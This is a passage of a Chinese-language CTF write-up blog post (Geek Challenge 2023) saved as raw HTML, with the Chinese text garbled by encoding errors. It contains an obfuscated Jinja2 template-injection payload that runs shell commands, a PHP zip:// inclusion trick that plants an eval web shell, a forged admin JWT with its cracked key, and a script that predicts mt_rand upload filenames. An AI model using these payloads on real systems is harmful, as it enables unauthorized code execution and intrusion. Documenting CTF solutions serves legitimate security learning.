%&#125;</span><br><span class="line">&#123;% set re=dict(re=a,ad=b)|join%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% set kon=(()|select|string|list)|attr(po)(17)%&#125; </span><br><span class="line">&#123;% set dian=(g|string|list)|attr(po)(6)%&#125;   	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% set qian=dict(p=a)|join%&#125;</span><br><span class="line">&#123;% set hou=dict(p=a,y=b)|join%&#125;</span><br><span class="line">&#123;% set ming=(kon,kon,dict(ap=a,p=b)|join,dian,hou)|join()%&#125;</span><br><span class="line">&#123;% set cmd=(dict(ca=a,t=b)|join,ming)|join()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% set a=()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%&#125;</span><br><span class="line">&#123;% set bb=(a|string|list)|attr(po)(246)%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% set ho=(dict(ap=a,p=b))|join%&#125;</span><br><span class="line">&#123;% set fl=(dict(fl4gfl4g=a,fl4g=b))|join%&#125;</span><br><span class="line">&#123;% set  cmd=(dict(ca=a,t=b)|join,kon,bb,ho,bb,fl)|join%&#125;</span><br><span class="line">&#123;% set res =()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%&#125;</span><br><span class="line">&#123;% print(res) %&#125;</span><br></pre></td></tr></table></figure>



<h2 id="famale-imp-l0ve"><a href="#famale-imp-l0ve" class="headerlink" title="famale_imp_l0ve"></a>famale_imp_l0ve</h2><p>åªèƒ½ä¸Šä¼ zipæ–‡ä»¶ï¼Œè€Œä¸”å­˜åœ¨ä¸€å¤„æ–‡ä»¶åŒ…å«ï¼Œé™åˆ¶äº†åç¼€å¿…é¡»ä¸º<code>.jpg</code>;è¿™é¢˜çš„phpç¯å¢ƒæ˜¯5.6ï¼›<code>\x00</code>çš„æˆªæ–­åœ¨php&gt;5.3.4å°±æ²¡ç”¨äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//o2takuXXå¸ˆå‚…è¯´æœ‰é—®é¢˜ï¼Œå¿˜çœ‹äº†ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, -<span class="number">4</span>)) == <span class="string">&quot;.jpg&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>åœ¨phpä¸­ zip:&#x2F;&#x2F;test.zip#1.pngæ˜¯ä»€ä¹ˆæ„æ€?</p>
<p>åœ¨PHPä¸­ï¼Œzip:&#x2F;&#x2F;test.zip#1.pngæ˜¯ä¸€ç§URLå°è£…åè®®ï¼Œå®ƒå…è®¸ä½ åƒè®¿é—®æœ¬åœ°æ–‡ä»¶ä¸€æ ·è®¿é—®ZIPå­˜æ¡£ä¸­çš„æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œzip:&#x2F;&#x2F;è¡¨ç¤ºä½¿ç”¨ZIPåè®®ï¼Œtest.zipæ˜¯ZIPå­˜æ¡£çš„æ–‡ä»¶åï¼Œ#1.pngè¡¨ç¤ºå­˜æ¡£ä¸­çš„æ–‡ä»¶è·¯å¾„ã€‚å› æ­¤ï¼Œzip:&#x2F;&#x2F;test.zip#1.pngæ„å‘³ç€ä½ æ­£åœ¨å¼•ç”¨test.zipå­˜æ¡£ä¸­çš„1.pngæ–‡ä»¶ã€‚</p>
<p>æ–°å»ºä¸€ä¸ªæ–‡ä»¶ <code>1.jpg</code><br>å›¾ç‰‡å†…å®¹å³å¯ä¸ºéœ€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¦‚<code>&lt;?php eval($_POST[1]); ?&gt;</code><br>æ‰“åŒ…æˆzip<br>å³<br><code>include.php?file=zip://upload/3.zip%231.jpg</code></p>
<h2 id="change-it"><a href="#change-it" class="headerlink" title="change_it"></a>change_it</h2><h3 id="source-code-2"><a href="#source-code-2" class="headerlink" title="source code"></a>source code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!--</span><br><span class="line">ç”¨æˆ·åä¸ºï¼šuser</span><br><span class="line">å¯†ç ä¹Ÿä¸ºï¼šuser</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>ç™»é™†ä¹‹åæ²¡æœ‰æƒé™ä¸Šä¼ æ–‡ä»¶ï¼ŒæŸ¥çœ‹cookieæ˜¯ä¸€æ®µjwtåŠ å¯†ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ç›´æ¥ç”¨å·¥å…·è·‘å‡ºkey</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key : &quot;yibao&quot;</span><br><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOiJ0cnVlIn0.qs6tjnaghMXiTsvqEMUauz_JGzxxKdtaXPGVtQUEHek</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨æœ‰æƒé™ä¸Šä¼ ä»»æ„æ–‡ä»¶äº†ï¼Œä½†æ˜¯åªçŸ¥é“æ–‡ä»¶ä¸Šä¼ åœ¨uploadä¸‹ï¼Œä¸çŸ¥é“æ–‡ä»¶åï¼ŒæŸ¥çœ‹æºä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">php_mt_seed</span>(<span class="params"><span class="variable">$seed</span></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$seed</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">      <span class="title function_ invoke__">php_mt_seed</span>(<span class="variable">$seed</span>);</span><br><span class="line">      <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$newFileName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">          <span class="variable">$newFileName</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>)];</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä»£ç å¾ˆæ˜æ˜¾äº†ï¼Œåªè¦çŸ¥é“timeçš„æ—¶é—´æˆ³ï¼Œæ—¢å¯ä»¥çŸ¥é“æ–‡ä»¶åï¼Œ</p>
<h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><p>è§£é‡Šä¸€ä¸‹æˆ‘çš„è„šæœ¬:è®¾ç½®ä¸€ä¸ªåç§’çš„æ—¶é—´æˆ³ï¼Œåœ¨è¿™åç§’ä¹‹å†…ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶å¿…å®šå¯ä»¥ä¸­ä¸€ä¸ªæ–‡ä»¶çš„æ—¶é—´æˆ³</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">php_mt_seed</span>(<span class="params"><span class="variable">$seed</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">10</span>; <span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$seed</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">        <span class="title function_ invoke__">php_mt_seed</span>(<span class="variable">$seed</span>);</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$seed</span>.<span class="string">&quot;: &quot;</span>;</span><br><span class="line">        <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">        <span class="variable">$newFileName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$newFileName</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$newFileName</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè¿™ä¸ªè„šæœ¬ï¼Œåœ¨åç§’ä¹‹å†…ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶å³å¯ï¼Œç„¶åè„šæœ¬ä¼šæ ¹æ®åä¸ªæ—¶é—´æˆ³è¾“å‡ºåä¸ªæ–‡ä»¶åï¼Œå…¶ä¸­å¿…å®šä¼šä¸­ä¸€ä¸ªæ–‡ä»¶å</p>
<h2 id="flagä¿å«æˆ˜-å¾…å¤ç°"><a href="#flagä¿å«æˆ˜-å¾…å¤ç°" class="headerlink" title="flagä¿å«æˆ˜(å¾…å¤ç°)"></a>flagä¿å«æˆ˜(å¾…å¤ç°)</h2><h2 id="ezrfi-å¾…å¤ç°"><a href="#ezrfi-å¾…å¤ç°" class="headerlink" title="ezrfi(å¾…å¤ç°)"></a>ezrfi(å¾…å¤ç°)</h2><h2 id="scan-tool-å¾…å¤ç°"><a href="#scan-tool-å¾…å¤ç°" class="headerlink" title="scan_tool(å¾…å¤ç°)"></a>scan_tool(å¾…å¤ç°)</h2><h2 id="ez-sql-å¾…å¤ç°"><a href="#ez-sql-å¾…å¤ç°" class="headerlink" title="ez_sql(å¾…å¤ç°)"></a>ez_sql(å¾…å¤ç°)</h2><h2 id="EZ-Smuggling-å¾…å¤ç°"><a href="#EZ-Smuggling-å¾…å¤ç°" class="headerlink" title="EZ_Smuggling(å¾…å¤ç°)"></a>EZ_Smuggling(å¾…å¤ç°)</h2><h2 id="java-å¾…å¤ç°"><a href="#java-å¾…å¤ç°" class="headerlink" title="java(å¾…å¤ç°)"></a>java(å¾…å¤ç°)</h2></p></div><div class="post-footer"><div class="tip">All rights reserved<br>Author: zIxyd</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-11-26</span><i class="fa fa-tag"></i><a class="tag" href="/tags/writeup/" title="writeup">writeup </a><span class="leancloud_visitors"></span><span>About 9245 words, 30 min 49 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=I%20have%20found%20a%20great%20blog.%0A%0AzIxyd's%20Blog%20%C2%B7%20Geek%20Challenge%202023%0Ahttps://zIxyd.github.io/2023/11/26/Geek%20Challenge%202023/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2023/12/07/Linux%E6%8F%90%E6%9D%83/" title="Linuxææƒæ€»ç»“">Previous</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2023/11/20/PHP_%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/" title="PHP_åŸç”Ÿç±»åˆ©ç”¨">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/darkLightToggle.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>